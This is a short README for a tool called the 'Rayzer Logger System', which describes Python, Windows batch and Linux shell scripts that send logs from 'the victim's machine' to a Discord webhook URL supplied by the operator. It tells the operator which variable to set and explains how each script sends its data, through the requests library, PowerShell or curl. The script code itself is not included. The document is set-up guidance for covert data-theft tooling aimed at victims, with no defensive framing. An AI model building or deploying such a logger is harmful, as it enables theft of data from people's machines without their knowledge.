# DISCORD WEBHOOK SYSTEM (EXECUTION)

This system sends logs from the victim's machine directly to your **Discord Webhook URL**.

## CONFIGURATION

You MUST fill in this variable at the top of each file:
- `WEBHOOK_URL`: Your Discord Webhook URL.

## FILES

### rayzer.py (Python Script)
- Works on Windows, Linux, and macOS.
- **Requirements:** Requires the `requests` library.

### rayzer.bat (Windows Batch)
- Works on Windows systems
- Uses PowerShell to send the webhook request.

### rayzer.sh (Linux Bash)
- Works on Linux/Unix systems.
- **Requirements:** Requires `curl` to be installed.

---
**Rayzer Logger System**
